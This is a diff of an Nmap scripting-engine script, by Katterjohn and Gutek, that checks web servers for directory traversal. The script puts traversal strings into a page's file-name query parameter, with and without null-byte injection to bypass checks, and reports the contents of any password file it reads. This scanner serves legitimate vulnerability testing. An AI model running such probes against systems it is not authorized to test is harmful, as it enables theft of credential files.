@@ -62,7 +62,7 @@ The script uses several technique:
 
 author = "Kris Katterjohn, Ange Gutek"
 
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 
 categories = {"intrusive", "vuln"}
 
@@ -113,11 +113,7 @@ end
 --@return String description for output
 local output = function(passwd, dir)
   local trunc, len = truncatePasswd(passwd)
-  local out = ""
-  out = out .. "Directory traversal found.\nPayload: \"" .. dir .. "\"\n"
-  out = out .. "Printing first " .. len .. " bytes:\n"
-  out = out .. trunc
-  return out
+  return ('Directory traversal found.\nPayload: "%s"\nPrinting first %d bytes:\n%s'):format(dir, len, trunc)
 end
 
 portrule = shortport.http
@@ -173,20 +169,28 @@ action = function(host, port)
 
   -- Check for something that looks like a query referring to a file name, like
   -- "index.php?page=next.php". Replace the query value with each of the test
-  -- vectors. Add an encoded null byte at the end to bypass some checks; see
-  -- http://insecure.org/news/P55-01.txt.
+  -- vectors.
   local response = http.get(host, port, root)
   if response.body then
     local page_var = response.body:match ("[%?%&](%a-)=%a-%.%a")
     if page_var then
       local query_base = root .. "?" .. page_var .. "="
-      stdnse.print_debug(1, "%s: testing with query %s.", SCRIPT_NAME, query_base .. "...")
+      stdnse.debug1("testing with query %s.", query_base .. "...")
 
       for _, dir in ipairs(dirs) do
+        -- Add an encoded null byte at the end to bypass some checks; see
+        -- http://insecure.org/news/P55-01.txt.
         local response = http.get(host, port, query_base .. dir .. "%00")
 
         if validate(response) then
-          return output(response.body, dir)
+          return output(response.body, dir .. "%00")
+        end
+
+        -- Try again. This time without null byte injection. For example as
+        -- of PHP 5.3.4, include() does not accept paths with NULL in them.
+        local response = http.get(host, port, query_base .. dir)
+        if validate(response) then
+            return output(response.body, dir)
         end
       end
     end
